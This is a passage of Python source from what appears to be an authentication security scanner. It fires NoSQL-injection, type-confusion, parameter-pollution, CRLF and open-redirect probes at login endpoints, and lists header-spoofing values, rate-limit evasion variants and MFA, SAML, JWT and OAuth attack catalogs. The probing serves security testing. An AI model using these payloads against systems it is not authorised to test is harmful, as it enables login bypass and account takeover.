        res["summary"] = "baseline request fail hui -> oracle skip (false-positive se bachna)"
        return res
    res["baseline"] = _login_shape(base)
    base_protected = base.status in (401, 403, 429) or not (200 <= base.status < 300)
    base_invalid = bool(ENUM_MSG_RE.search(base.text or "") or GENERIC_MSG_RE.search(base.text or ""))

    def looks_bypassed(r):
        if r is None:
            return False
        if r.status and 200 <= r.status < 400 and base_protected:
            if r.status in (302, 303) or (r.header("Location") or ""):
                return True
            if not (ENUM_MSG_RE.search(r.text or "") or GENERIC_MSG_RE.search(r.text or "")):
                return True
        return False

    # 1) NoSQL JSON operator ($ne / $gt)
    for op, val in INJECT_MARKERS.items():
        if op not in ("$ne", "$gt"):
            continue
        r = fire("nosql_json:%s" % op, ident0, json_body={
            "username": ident0, "email": ident0, "password": {op: val}})
        if looks_bypassed(r):
            res["nosql_accepted"] = True

    # 1b) NoSQL form-encoded (PHP/Rails style password[$ne]=x)
    r = fire("nosql_form", ident0, data_override={"password[$ne]": "x"}, drop_password=True)
    if looks_bypassed(r):
        res["nosql_accepted"] = True

    # 2) bounded 'admin' operator probe (detection-style; sirf 1 request)
    r = fire("nosql_admin:$ne", "admin", json_body={"username": "admin", "email": "admin",
                                                    "password": {"$ne": "x"}})
    if looks_bypassed(r):
        res["nosql_accepted"] = True

    # 3) JSON type confusion (sirf 2 representative types)
    for label, tv in (("null", None), ("zero", 0)):
        r = fire("typeconf:%s" % label, ident0, json_body={
            "username": ident0, "email": ident0, "password": tv})
        if r is not None and base is not None:
            d = drf_compare(base, r)
            if looks_bypassed(r) or (d.get("diff_score", 0) >= 20 and base_invalid):
                res["type_confusion"] = True

    # 4) HPP - identifier double (form) + array form
    rurl, method, data, headers = _build_login_request(probe, ident0, "WaspInvalid!" + rand_str(4))
    uf = next((k for k in data if k in USERNAME_FIELDS), "username")
    if budget - state["used"] >= 1:
        state["used"] += 1
        try:
            body = "%s=%s&%s=%s&password=x" % (uf, ident0, uf, ident0)
            r = http.request(method, rurl, headers=dict(headers, **{"Content-Type":
                                         "application/x-www-form-urlencoded"}),
                             data=body.encode(), allow_redirects=False, read_only_post=True)
            res["probes"].append({"label": "hpp_double", "status": r.status,
                                  "shape": _login_shape(r)})
            if base is not None:
                d = drf_compare(base, r)
                if d.get("diff_score", 0) >= 20 or looks_bypassed(r):
                    res["hpp_diff"] = True
        except Exception as e:
            res["probes"].append({"label": "hpp_double", "error": truncate(repr(e), 160)})
    if budget - state["used"] >= 1:
        state["used"] += 1
        try:
            body = "%s[]=%s&password=x" % (uf, ident0)
            r = http.request(method, rurl, headers=dict(headers, **{"Content-Type":
                                         "application/x-www-form-urlencoded"}),
                             data=body.encode(), allow_redirects=False, read_only_post=True)
            res["probes"].append({"label": "hpp_array", "status": r.status,
                                  "shape": _login_shape(r)})
            if base is not None:
                d = drf_compare(base, r)
                if d.get("diff_score", 0) >= 20 or looks_bypassed(r):
                    res["hpp_diff"] = True
        except Exception as e:
            res["probes"].append({"label": "hpp_array", "error": truncate(repr(e), 160)})

    # 5) Content-Type confusion (form creds as JSON)
    r = fire("ct_confusion", ident0, data_override={}, json_body={
        "username": ident0, "email": ident0, "password": "WaspInvalid!" + rand_str(4)})
    if r is not None and base is not None:
        d = drf_compare(base, r)
        if d.get("diff_score", 0) >= 20 or (r.status != base.status and base_invalid):
            res["content_type_diff"] = True

    # 6) method override signal (1 request; sirf record, finding nahi)
    fire("method_override", ident0, "WaspInvalid!" + rand_str(4),
         extra_headers={"X-HTTP-Method-Override": "PUT"})

    res["budget_used"] = state["used"]
    res["summary"] = ("budget_used=%d | nosql=%s | typeconf=%s | hpp=%s | ct_diff=%s" % (
        state["used"], res["nosql_accepted"], res["type_confusion"], res["hpp_diff"],
        res["content_type_diff"]))
    return res


# ---------------------------------------------------------------------------
# v10 STAGE P - CORS PROBE (auth endpoints, bounded)
# ---------------------------------------------------------------------------

def cors_probe(http, scope, url, conf=None):
    """Origin echo + credentials check - 2 requests max, invalid .test origins."""
    conf = conf or {}
    res = {"endpoint": url, "origin": INVALID_ORIGIN, "reflected": False, "wildcard": False,
           "credentials": False, "origin_null_reflected": False, "allow_methods": ""}
    r = http.request("GET", url, headers={"Origin": INVALID_ORIGIN}, allow_redirects=False)
    acao = r.header("Access-Control-Allow-Origin") or ""
    acac = (r.header("Access-Control-Allow-Credentials") or "").strip().lower()
    res["reflected"] = (acao.strip() == INVALID_ORIGIN)
    res["wildcard"] = (acao.strip() == "*")
    res["credentials"] = (acac == "true")
    res["allow_methods"] = (r.header("Access-Control-Allow-Methods") or "")[:120]
    if res["reflected"]:
        r2 = http.request("GET", url, headers={"Origin": NULL_ORIGIN}, allow_redirects=False)
        res["origin_null_reflected"] = ((r2.header("Access-Control-Allow-Origin") or "").strip()
                                        in ("null", NULL_ORIGIN))
    res["verdict"] = ("cred-reflection" if res["reflected"] and res["credentials"]
                      else "wildcard" if res["wildcard"]
                      else "reflection-only" if res["reflected"] else "tight")
    res["summary"] = ("acao=%s | credentials=%s | null_reflected=%s -> %s" % (
        acao or "-", res["credentials"], res["origin_null_reflected"], res["verdict"]))
    return res


# ---------------------------------------------------------------------------
# v10 STAGE Q - AUTH PAGE HARDENING (passive, 0 requests)
# ---------------------------------------------------------------------------

def auth_hardening_report(live):
    """Stage B probes ke responses se (0 extra requests):
    clickjacking, cacheable auth response, referrer-policy, autocomplete,
    SameSite=None-without-Secure, webauthn aggregate."""
    out = {"endpoints": {}, "clickjacking": [], "cacheable": [], "samesite_issues": [],
           "autocomplete_on": [], "webauthn_seen": [], "summary": ""}
    for u, r in live.items():
        h = r.get("hardening") or {}
        entry = {"scheme": r.get("scheme"), "status": r.get("status")}
        is_html = "html" in (r.get("content_type") or "").lower()
        if is_html:
            xfo, fa = h.get("x_frame_options"), h.get("frame_ancestors")
            if not xfo and not fa:
                entry["clickjacking"] = True
                out["clickjacking"].append(u)
            cc = h.get("cache_control")
            entry["cache_control"] = cc
            if not (cc and NO_STORE_RE.search(cc)):
                entry["cacheable"] = True
                entry["cdn_hints"] = h.get("cdn_hints") or []
                out["cacheable"].append(u)
            if not h.get("referrer_policy"):
                entry["referrer_policy_missing"] = True
        for raw in (r.get("set_cookie") or []):
            low = raw.lower()
            if "samesite=null" in low and "secure" not in low:
                nm = raw.split("=", 1)[0]
                entry.setdefault("samesite_issue", nm)
                out["samesite_issues"].append({"endpoint": u, "cookie": nm})
        pol = r.get("password_policy_hint") or {}
        if pol.get("autocomplete", "").lower() == "on" or \
                (pol.get("autocomplete") == "" and r.get("has_password")):
            entry["password_autocomplete"] = "on/unspecified"
            out["autocomplete_on"].append(u)
        if r.get("webauthn"):
            out["webauthn_seen"].append(u)
        out["endpoints"][u] = entry
    out["summary"] = ("clickjacking=%d | cacheable=%d | samesite=%d | autocomplete=%d | "
                      "webauthn=%d" % (len(out["clickjacking"]), len(out["cacheable"]),
                                       len(out["samesite_issues"]), len(out["autocomplete_on"]),
                                       len(out["webauthn_seen"])))
    return out


# ---------------------------------------------------------------------------
# v10 STAGE R - OPEN REDIRECT / REFLECTION / CRLF (bounded GET probes)
# ---------------------------------------------------------------------------

def redirect_reflection_probe(http, scope, url, probe, conf):
    """
    Auth endpoints ke redirect params par (GET only, .test hosts):
      1) open redirect - Location attacker-invalid.test par?
      2) reflection    - benign marker page me wapas aaya? context classify
      3) CRLF          - %0d%0a header injection indicator
    """
    res = {"endpoint": url, "params_tested": [], "open_redirect": False, "reflection": [],
           "crlf": False, "summary": ""}
    params = [p for p in (probe.get("redirect_params") or [])][:2]
    if not params:
        res["summary"] = "koi redirect param nahi mila -> skip (0 requests)"
        return res
    evil_host = "wasp-redir-%s.attacker-invalid.test" % rand_str(4)
    base_u = probe.get("final_url") or url
    sep = "&" if "?" in base_u else "?"
    for p in params:
        # 1) open redirect
        val = "https://%s/cb" % evil_host
        r = http.request("GET", "%s%s%s=%s" % (base_u, sep, p, urllib.parse.quote(val, safe="")),
                         allow_redirects=False)
        loc = r.header("Location") or ""
        hit = bool(r.status in (301, 302, 303, 307, 308) and evil_host in loc)
        res["params_tested"].append({"param": p, "probe": "open_redirect", "status": r.status,
                                     "location": loc[:160], "redirected": hit})
        if hit:
            res["open_redirect"] = True
        # 2) reflection (benign marker)
        if conf.get("auth_allow_reflection_probe", True):
            marker = REFLECT_MARKER + rand_str(3)
            r2 = http.request("GET", "%s%s%s=%s" % (base_u, sep, p,
                                                    urllib.parse.quote(marker, safe="")),
                              allow_redirects=True)
            body = r2.text or ""
            if marker in body:
                idx = body.index(marker)
                ctx = body[max(0, idx - 40):idx + 40]
                kind = ("attr" if re.search(r"=\s*[\"'][^\"']*$", ctx) else
                        "js" if re.search(r"(script|var|')\s*$", ctx, re.I) else "html")
                res["reflection"].append({"param": p, "context": kind,
                                          "status": r2.status, "snippet": truncate(ctx, 100)})
        # 3) CRLF header injection
        r3 = http.request("GET", "%s%s%s=%s" % (base_u, sep, p, CRLF_PROBE),
                          allow_redirects=False)
        hdr_names = {k.lower() for k, v in (r3.headers.items() if r3.headers else [])}
        if "x-wasp-probe" in hdr_names:
            res["crlf"] = True
            res["params_tested"].append({"param": p, "probe": "crlf", "status": r3.status,
                                         "injected_header": True})
    res["summary"] = ("params=%s | open_redirect=%s | reflection=%d | crlf=%s" % (
        [p["param"] if isinstance(p, dict) else p for p in params], res["open_redirect"],
        len(res["reflection"]), res["crlf"]))
    return res


# ---------------------------------------------------------------------------
# v10 STAGE S - JWT DEEP ANALYSIS (offline, 0 requests)
# ---------------------------------------------------------------------------

def _dup_json_keys(payload_text):
    """JSON payload me duplicate object keys (parser discrepancy indicator)."""
    dups = []

    def hook(pairs):
        seen = {}
        for k, _v in pairs:
            seen[k] = seen.get(k, 0) + 1
        dups.extend([k for k, c in seen.items() if c > 1])
        return dict(pairs)

    try:
        json.loads(payload_text, object_pairs_hook=hook)
    except Exception:
        return []
    return sorted(set(dups))

def jwt_deep_analysis(jwt_report, live, oauth_report):
    """Pre-auth JWTs par offline deep checks: key-injection headers (jku/x5u/x5c/jwk),
    duplicate claims, exp-iat lifetime, token-in-URL, HS256 confusion candidate."""
    out = {"analyzed": 0, "key_injection": [], "duplicate_claims": [], "long_lived": [],
           "confusion_candidates": [], "token_in_url": [], "notes": []}
    jwks_known = False
    for _u, doc in ((oauth_report or {}).get("documents") or {}).items():
        if doc.get("jwks_uri"):
            jwks_known = True
            out["notes"].append("jwks_uri discovery se mila: %s" % doc.get("jwks_uri"))
    for u, r in live.items():
        if r.get("token_in_url"):
            out["token_in_url"].append(u)
    for ji in jwt_report or []:
        out["analyzed"] += 1
        hdr = ji.get("header") or {}
        pay = ji.get("payload") or {}
        key_urls = [hdr.get(k) for k in ("jku", "x5u") if hdr.get(k)]
        if key_urls or any(k in hdr for k in ("x5c", "jwk")):
            rec = {"endpoint": ji.get("endpoint"), "jku": hdr.get("jku"), "x5u": hdr.get("x5u"),
                   "has_x5c": "x5c" in hdr, "has_jwk": "jwk" in hdr}
            out["key_injection"].append(rec)
            ji["key_injection_headers"] = rec
        # duplicate claims: raw payload segment parse
        tok = None
        for u2, r2 in live.items():
            for t in (r2.get("jwts") or []):
                if jwt_info(t).get("header") == hdr and u2 == ji.get("endpoint"):
                    tok = t
                    break
        if not tok and ji.get("preview"):
            tok = None
        if tok:
            seg = tok.split(".")[1]
            seg += "=" * (-len(seg) % 4)
            try:
                raw = base64.urlsafe_b64decode(seg.encode()).decode("utf-8", "replace")
                dk = _dup_json_keys(raw)
                if dk:
                    ji["duplicate_claims"] = dk
                    out["duplicate_claims"].append({"endpoint": ji.get("endpoint"),
                                                    "claims": dk})
            except Exception:
                pass
        exp, iat = pay.get("exp"), pay.get("iat")
        try:
            if exp and iat and (float(exp) - float(iat)) > 86400:
                ji["lifetime_hours"] = round((float(exp) - float(iat)) / 3600.0, 1)
                out["long_lived"].append({"endpoint": ji.get("endpoint"),
                                          "hours": ji["lifetime_hours"]})
        except Exception:
            pass
        alg = (ji.get("alg") or "").upper()
        if jwks_known and (alg.startswith("RS") or alg.startswith("PS") or alg.startswith("ES")):
            out["confusion_candidates"].append({"endpoint": ji.get("endpoint"), "alg": alg})
            ji["hs256_confusion_candidate"] = True
    return out


# ---------------------------------------------------------------------------
# v10 STAGE U - BRUTE-FORCE DEFENSE COMPOSITE SCORE
# ---------------------------------------------------------------------------

def defense_score(login_eps, live, rl_report, enum_report, mfa_report, csrf_report):
    """Per-login-endpoint stuffing-readiness score (0-6). Analysis-only."""
    out = {"endpoints": {}, "weak": [], "strong": [], "summary": ""}
    for u in login_eps:
        pts = []
        enum_res = ((enum_report.get("endpoints") or {}).get(u)) or {}
        rl_res = (rl_report or {}).get(u) or {}
        pts.append(("generic_error", 1 if not enum_res.get("enumeration_likely") else 0))
        pts.append(("rate_limit", 1 if rl_res.get("throttled") else 0))
        pts.append(("lockout_model", 1 if rl_res.get("lockout_model", "none") not in (None, "none") else 0))
        pts.append(("captcha", 1 if (live.get(u, {}) or {}).get("captcha") else 0))
        pts.append(("csrf_token", 1 if (live.get(u, {}) or {}).get("csrf_present") else 0))
        pts.append(("mfa_present", 1 if bool(mfa_report) else 0))
        score = sum(v for _k, v in pts)
        verdict = ("weak" if score <= 2 else "moderate" if score <= 4 else "strong")
        out["endpoints"][u] = {"score": score, "max": 6, "verdict": verdict,
                               "points": dict(pts)}
        if verdict == "weak":
            out["weak"].append(u)
        elif verdict == "strong":
            out["strong"].append(u)
    out["summary"] = ("logins=%d | weak=%d | moderate=%d | strong=%d" % (
        len(login_eps), len(out["weak"]),
        len([e for e, v in out["endpoints"].items() if v["verdict"] == "moderate"]),
        len(out["strong"])))
    return out


# ---------------------------------------------------------------------------
# STAGE L - AUTH STATE MACHINE
# ---------------------------------------------------------------------------

def build_state_machine(live, login_eps, reset_eps, mfa_eps, reg_eps, oidc, oauth_eps=None):
    def p(u):
        return urllib.parse.urlparse(u).path or u
    L = ["# Authentication State Machine (auto-mapped)", "",
         "Phase 9 me observed transitions. `stateDiagram-v2` ko Mermaid renderer me kholo.", "",
         "```mermaid", "stateDiagram-v2", "    [*] --> Anonymous"]
    if reg_eps:
        L.append("    Anonymous --> Registration : GET %s" % p(reg_eps[0]))
        L.append("    Registration --> Credentials : form submit")
    L.append("    Anonymous --> Credentials : GET %s" % (p(login_eps[0]) if login_eps else "/login"))
    L.append("    Credentials --> Authenticated : valid credentials")
    if mfa_eps:
        L.append("    Credentials --> MFA_Challenge : MFA enforced")
        L.append("    MFA_Challenge --> Authenticated : valid OTP")
        L.append("    MFA_Challenge --> MFA_Challenge : invalid OTP")
    if reset_eps:
        L.append("    Credentials --> Password_Reset : GET %s" % p(reset_eps[0]))
        L.append("    Password_Reset --> Credentials : token accepted")
    if oidc:
        L.append("    Anonymous --> SSO_Provider : OIDC discovery")
        L.append("    SSO_Provider --> Authenticated : code exchanged")
    L.append("    Authenticated --> Anonymous : logout")
    L.append("```")
    L += ["", "## Endpoint inventory", "",
          "| Role | Endpoint | Status | Form | CSRF | Transport |",
          "|---|---|---|---|---|---|"]
    for role, eps in (("login", login_eps), ("reset", reset_eps), ("mfa", mfa_eps),
                      ("register", reg_eps)):
        for u in eps:
            r = live.get(u, {})
            L.append("| %s | `%s` | %s | %s | %s | %s |" % (
                role, p(u), r.get("status"),
                "yes" if r.get("has_password") else "-",
                "yes" if r.get("csrf_present") else "-",
                r.get("scheme") or "-"))
    return "\n".join(L) + "\n"


# ---------------------------------------------------------------------------
# STAGE M - REPORTS
# ---------------------------------------------------------------------------

def _ensure_read_only_support(http):
    """v10 compat: read_only_post kwarg sirf naye ULTRA cores par supported hai.
    Purana wasp_core ho to kwarg drop hota hai (wahan POSTs pehle se allowed hain)
    - module dono cores par error-free chalta hai."""
    try:
        import inspect
        sig = inspect.signature(http.request)
        if "read_only_post" in sig.parameters:
            return http
    except Exception:
        return http
    orig = http.request

    def patched(method, url, **kw):
        kw.pop("read_only_post", None)
        return orig(method, url, **kw)

    http.request = patched
    return http


# ===========================================================================
# P21 v22 CONSTANTS - knobs / families / maps / variant shapes
# ===========================================================================
V22_KNOBS = {
    # ---- v22 ULTRA PRO MAX knobs (P21 authz/OAuth era) ----
    "auth_enum_ladder_max": 6,                 # canary identifiers ladder cap
    "auth_allow_header_trust": True,           # XFF/X-Original-URL canary echo (GET)
    "auth_header_trust_cap": 6,                # header-trust probe hard cap
    "auth_allow_oauth_census": True,           # OIDC discovery + param shape (GET)
    "auth_allow_oauth_variant_probe": False,   # redirect_uri allowlist shape (RoE)
    "auth_oauth_variant_cap": 6,               # redirect_uri variants hard cap
    "auth_allow_authz_matrix": False,          # horizontal/vertical differential (RoE)
    "auth_authz_matrix_cap": 8,                # authz matrix probes hard cap
    "auth_allow_mfa_replay_probe": False,      # OTP 2-sequential resubmit (RoE)
    "auth_allow_lifecycle_probe": True,        # refresh/logout GET-shape census
    "auth_allow_pretakeover_probe": False,     # duplicate-registration oracle (RoE)
    "auth_allow_bypass2_matrix": False,        # 17 request-shape variants (RoE)
    "auth_bypass2_cap": 17,                    # bypass2 variants hard cap
    "auth_jwks_fetch": True,                   # JWKS endpoint GET + header census
    "auth_policy_census": True,                # password-policy/anti-auto census
    "auth_state_machine": True,                # auth flow state machine builder
    "auth_exec_summary": True,                 # exec-summary artifact
}
DEFAULTS.update(V22_KNOBS)

V23_KNOBS = {
    # ---- v23 FINAL ULTRA PRO MAX knobs (P21 auth hygiene/SSO era) ----
    "auth23_password_matrix": True,            # passive form-hygiene matrix
    "auth23_allow_rememberme_probe": False,    # RoE: 2-GET persistence shape
    "auth23_rememberme_cap": 4,                # remember-me probe hard cap
    "auth23_session_property_matrix": True,    # passive cookie property matrix
    "auth23_allow_recovery_probe": False,      # RoE: recovery/KBA GET shape
    "auth23_allow_sequence_probe": False,      # RoE: login redirect-chain shape
    "auth23_sequence_cap": 3,                  # sequencing census hard cap
    "auth23_sso_grant_matrix": True,           # passive grant/response-mode matrix
    "auth23_allow_binding_probe": False,       # RoE: token-binding GET shape
    "auth23_token_binding_catalog": True,      # passive DPoP/mTLS indicators
    "auth23_header_posture": True,             # passive auth header posture
    "auth23_stuffing_posture": True,           # passive stuffing composite
}
DEFAULTS.update(V23_KNOBS)


# canary family - P21 identifiers/params sab isi family ke (INERT)
CANARY = "waspP21"
CANARY_ALT = "waspP21b"
CANARY_EMAIL = "waspP21@example.invalid"       # .invalid TLD -> koi real email nahi
CANARY_PARAM_RE = re.compile(r"(?i)^(waspP21|waspP21b)")

# ---------------------------------------------------------------------------
# 22 families + CWE + MITRE maps (P12/P20 v22 pattern)
# ---------------------------------------------------------------------------
_FAMS = ["ENUM", "LOCKOUT", "RESET", "MFA", "JWT", "OAUTH", "SAML",
         "SESSION", "TRANSPORT", "CORS", "REDIRECT", "INJECT",
         "HEADER_TRUST", "REGISTRATION", "AUTHZ", "POLICY", "CAPTCHA",
         "LIFECYCLE", "SSO_LOGOUT", "BYPASS2", "HIDPARAM", "CHAIN",
         "PWD_HYGIENE", "RECOVERY", "TOKEN_BIND", "STUFFING"]

_FAMILY_CWE = {
    "ENUM": ["CWE-203"], "LOCKOUT": ["CWE-307", "CWE-645"],
    "RESET": ["CWE-640", "CWE-330"], "MFA": ["CWE-308", "CWE-294"],
    "JWT": ["CWE-347", "CWE-327"], "OAUTH": ["CWE-603", "CWE-352"],
    "SAML": ["CWE-347"], "SESSION": ["CWE-384", "CWE-613"],
    "TRANSPORT": ["CWE-319"], "CORS": ["CWE-942"],
    "REDIRECT": ["CWE-601"], "INJECT": ["CWE-943", "CWE-843"],
    "HEADER_TRUST": ["CWE-348", "CWE-290"], "REGISTRATION": ["CWE-640"],
    "AUTHZ": ["CWE-285", "CWE-639"], "POLICY": ["CWE-521"],
    "CAPTCHA": ["CWE-799"], "LIFECYCLE": ["CWE-613"],
    "SSO_LOGOUT": ["CWE-613"], "BYPASS2": ["CWE-288"],
    "HIDPARAM": ["CWE-1233"], "CHAIN": ["CWE-693"],
    "PWD_HYGIENE": ["CWE-521", "CWE-1390"], "RECOVERY": ["CWE-640", "CWE-1391"],
    "TOKEN_BIND": ["CWE-320", "CWE-347"], "STUFFING": ["CWE-307", "CWE-811"],
}
_FAMILY_MITRE = {
    "ENUM": ["T1110.003"], "LOCKOUT": ["T1110"], "RESET": ["T1078.004"],
    "MFA": ["T1110"], "JWT": ["T1606.002"], "OAUTH": ["T1550.001"],
    "SAML": ["T1606.002"], "SESSION": ["T1539"],
    "TRANSPORT": ["T1040"], "CORS": ["T1189"],
    "REDIRECT": ["T1206"], "INJECT": ["T1059.006"],
    "HEADER_TRUST": ["T1098"], "REGISTRATION": ["T1078.004"],
    "AUTHZ": ["T1068"], "POLICY": ["T1110"], "CAPTCHA": ["T1110"],
    "LIFECYCLE": ["T1539"], "SSO_LOGOUT": ["T1539"],
    "BYPASS2": ["T1014"], "HIDPARAM": ["T1190"], "CHAIN": ["T1068"],
    "PWD_HYGIENE": ["T1110"], "RECOVERY": ["T1078.004"],
    "TOKEN_BIND": ["T1557"], "STUFFING": ["T1110.004"],
}

# ---------------------------------------------------------------------------
# enum oracle ladder - response-shape classifier keys
# ---------------------------------------------------------------------------
ENUM_LADDER_SHAPES = ["status_diff", "size_diff", "time_diff",
                      "body_shape_diff", "error_code_diff",
                      "drf_shape_fingerprint", "generic_message_override"]
# drf shape fingerprint classes (v10 DRF-v2 + v22 extensions)
DRF_SHAPE_CLASSES = ["detail_user_not_found", "detail_password_mismatch",
                     "non_field_error", "error_code_oracle", "json_pointer_diff",
                     "set_cookie_diff", "session_rollover_diff"]

# ---------------------------------------------------------------------------
# OAuth/OIDC shapes
# ---------------------------------------------------------------------------
OIDC_DISCOVERY_PATHS = ["/.well-known/openid-configuration",
                        "/.well-known/oauth-authorization-server",
                        "/.well-known/openid-configuration/auth"]
OAUTH_ENDPOINT_KEYS = ["authorization_endpoint", "token_endpoint",
                       "userinfo_endpoint", "jwks_uri",
                       "registration_endpoint", "end_session_endpoint",
                       "introspection_endpoint", "revocation_endpoint",
                       "device_authorization_endpoint", "pushed_authorization_request_endpoint"]
OAUTH_RESPONSE_TYPES = ["code", "token", "id_token",
                        "code token", "code id_token", "id_token token",
                        "code id_token token", "none"]
PKCE_METHODS = ["S256", "plain"]
# redirect_uri variant shapes (same-origin canary targets only - zero egress)
OAUTH_VARIANT_SHAPES = [
    ("path_traversal", "/../canaryP21"),
    ("dot_segment", "/./canaryP21"),
    ("trailing_slash", "/canaryP21/"),
    ("url_encoded", "/%63anaryP21"),
    ("double_slash", "//canaryP21.evil.invalid"),
    ("subdomain_canary", "https://canaryP21.example.invalid"),
    ("protocol_downgrade", "http://LOCALHOST/canaryP21"),
    ("param_chain", "/login?next=/canaryP21"),
]

# ---------------------------------------------------------------------------
# header-trust census headers (canary echo, read-only)
# ---------------------------------------------------------------------------
HEADER_TRUST_HEADERS = [
    ("X-Forwarded-For", "203.0.113.7"),
    ("X-Forwarded-Host", "canaryP21.example.invalid"),
    ("X-Original-URL", "/canaryP21"),
    ("X-Rewrite-URL", "/canaryP21"),
    ("X-Forwarded-Proto", "http"),
    ("X-Custom-IP-Authorization", "203.0.113.7"),
]

# ---------------------------------------------------------------------------
# bypass2 - 17 request-shape variants (auth rate-limit census, GATED)
# label -> (mutation, class)
# ---------------------------------------------------------------------------
BYPASS2_AUTH_SHAPES = [
    ("xff_spoof", "X-Forwarded-For canary per request", "header-trust"),
    ("xff_rotate", "X-Forwarded-For rotation canary pool", "header-trust"),
    ("real_ip", "X-Real-IP canary swap", "header-trust"),
    ("host_case", "Host case-flip (LoCaLhOsT)", "normalization"),
    ("path_case", "path case-flip (/LoGiN)", "normalization"),
    ("path_dot", "path dot-segment insert (/./login)", "normalization"),
    ("path_double", "double-slash path (//login)", "normalization"),
    ("url_encode", "url-encoded path (%2Flogin)", "normalization"),
    ("param_padding", "junk param padding (?p=canary)", "parser-diff"),
    ("verb_alt", "alternate safe verb (HEAD/OPTIONS)", "method"),
    ("ct_flip", "content-type flip form<->json", "parser-diff"),
    ("charset_tail", "charset param tail (;charset=utf-7)", "parser-diff"),
    ("body_wrap", "json body array-wrap shape", "parser-diff"),
    ("dup_header", "duplicate header shape", "parser-diff"),
    ("http2_hint", "HTTP/2 fingerprint hint (documented)", "documented"),
    ("sess_rollover", "session rollover canary", "session"),
    ("combo_chain", "case+encode+xff chain", "chain"),
]

# ---------------------------------------------------------------------------
# documented-only technique catalogs (execution FORBIDDEN without RoE wave)
# ---------------------------------------------------------------------------
DOCUMENTED_MFA_TECHNIQUES = [
    ("otp_brute_window", "OTP brute within rate-limit window (documented)"),
    ("otp_replay", "OTP reuse across sessions (documented)"),
    ("backup_code_space", "backup-code space census (documented)"),
    ("mfa_fatigue", "push-fatigue storm (FORBIDDEN - manual RoE only)"),
    ("response_tamper", "client-side MFA decision tamper (documented)"),
    ("status_leak", "MFA-step status oracle (documented)"),
    ("remember_2fa", "remember-2fa cookie census (documented)"),
    ("sms_voice_swap", "SMS->voice channel swap (documented)"),
]
DOCUMENTED_SAML_TECHNIQUES = [
    ("xsw_comment", "XML signature wrapping - comment injection (documented)"),
    ("xsw_clone", "signature wrapping - object clone (documented)"),
    ("xsw_extension", "signature wrapping - extensions block (documented)"),
    ("assertion_replay", "assertion replay window (documented)"),
    ("audience_confusion", "audience restriction mismatch (documented)"),
    ("relaystate_open", "RelayState open-redirect (documented)"),
]
DOCUMENTED_OAUTH_TECHNIQUES = [
    ("code_interception", "authorization-code interception (documented)"),
    ("state_csrf", "missing/weak state -> CSRF login attach (documented)"),
    ("nonce_replay", "nonce replay for id_token (documented)"),
    ("pkce_downgrade", "PKCE plain/S256 downgrade (documented)"),
    ("redirect_uri_parsing", "redirect_uri parser differential (documented)"),
    ("token_substitution", "access-token substitution (documented)"),
    ("idp_mixup", "IdP mix-up attack (documented)"),
    ("discoverable_client", "dynamic client registration abuse (documented)"),
]
DOCUMENTED_JWT_TECHNIQUES = [
    ("alg_none", "alg=none downgrade (documented)"),
    ("alg_confusion", "RS256->HS256 confusion (documented)"),
    ("kid_injection", "kid path/SQLi shape (documented)"),
    ("jku_spoof", "jku/x5u external JWKS (documented - zero egress)"),
    ("claim_injection", "role/email claim injection (documented)"),
    ("exp_nbf_skip", "missing exp/nbf validation (documented)"),
    ("aud_bypass", "aud multi-value confusion (documented)"),
    ("jwk_header", "embedded jwk header trust (documented)"),
]
VALUE_ORACLE_INPUTS = [("", "empty"), ("waspP21 ", "whitespace"),
                       ("%%waspP21%%", "wildcards"), ("waspP21\x00", "null-byte"),
                       ("WASPP21", "case"), ("waspP21'.", "quote-tail")]

SEVERITY_HINTS_V22 = {
    # OAuth/OIDC
    "oauth_pkce_absent": ("High", "CVSS ~7.1", "PKCE absent - authorization-code interception surface."),
    "oauth_state_absent": ("High", "CVSS ~7.1", "state absent - login-CSRF attach possible."),
    "oauth_nonce_absent": ("Medium", "CVSS ~5.3", "nonce absent - id_token replay window."),
    "oauth_redirect_loose": ("Critical", "CVSS ~9.1", "redirect_uri validation permissive - code leak."),
    "oauth_discovery_open": ("Info", "CVSS ~0.0", "OIDC discovery document publicly readable."),
    "oauth_idtoken_claims": ("Medium", "CVSS ~5.3", "id_token claims (roles/aud) sensitive shape."),
    "oauth_variant_accepted": ("Critical", "CVSS ~9.1", "redirect_uri variant ACCEPTED - code interception."),
    "oauth_error_shape": ("Low", "CVSS ~3.1", "OAuth error-shape differential - client oracle."),
    "oauth_jwks_cacheable": ("Low", "CVSS ~2.1", "JWKS cacheable - stale-key confusion window."),
    "oauth_registration_open": ("High", "CVSS ~7.1", "Dynamic client registration open."),
    # authz
    "authz_horizontal_diff": ("Critical", "CVSS ~9.1", "Horizontal authz differential - BOLA/IDOR shape."),
    "authz_vertical_preauth": ("Critical", "CVSS ~9.4", "Privileged path pre-auth accessible."),
    "authz_role_param_echo": ("High", "CVSS ~7.5", "Role param echo - privilege confusion."),
    "authz_privileged_target": ("Info", "CVSS ~0.0", "Privileged target feedforward noted."),
    # header trust
    "header_xff_trusted": ("High", "CVSS ~7.5", "XFF canary echo - IP-trust bypass shape."),
    "header_original_url_echo": ("High", "CVSS ~7.5", "X-Original-URL echo - authz routing bypass shape."),
    "header_host_poison_shape": ("Medium", "CVSS ~5.3", "Host header poisoning shape observed."),
    # MFA / lifecycle
    "mfa_replay_shape": ("High", "CVSS ~7.1", "OTP replay window observed."),
    "mfa_entropy_weak": ("High", "CVSS ~7.5", "OTP space chhota - brute feasible."),
    "mfa_backup_code_space": ("Medium", "CVSS ~5.3", "Backup-code space census."),
    "lifecycle_refresh_shape": ("Medium", "CVSS ~4.3", "Refresh endpoint shape noted."),
    "lifecycle_remember_predictable": ("High", "CVSS ~7.5", "Remember-me token low entropy."),
    "logout_state_live": ("Medium", "CVSS ~5.3", "Logout ke baad session state live."),
    # policy / captcha
    "policy_min_length_weak": ("Low", "CVSS ~3.1", "Password min-length policy kamzor."),
    "policy_no_complexity": ("Low", "CVSS ~3.1", "Complexity rule absent."),
    "captcha_absent_auth": ("Medium", "CVSS ~5.3", "Anti-automation marker absent on auth flows."),
    "anti_auto_absent": ("Medium", "CVSS ~5.3", "Anti-automation census ABSENT."),
    # bypass2 / misc
    "bypass2_shape_win": ("High", "CVSS ~7.5", "Request-shape differential - throttle evasion surface."),
    "enum_ladder_confirmed": ("High", "CVSS ~7.1", "Enumeration ladder shapes confirmed."),
    "reset_host_header": ("High", "CVSS ~7.5", "Reset host-header injection shape."),
    "pretakeover_shape": ("Critical", "CVSS ~8.8", "Pre-account-takeover shape (unverified email claim)."),
    "saml_metadata_open": ("Low", "CVSS ~2.1", "SAML metadata publicly readable."),
    "jwt_jku_shape": ("High", "CVSS ~7.5", "jku/x5u key-injection surface."),
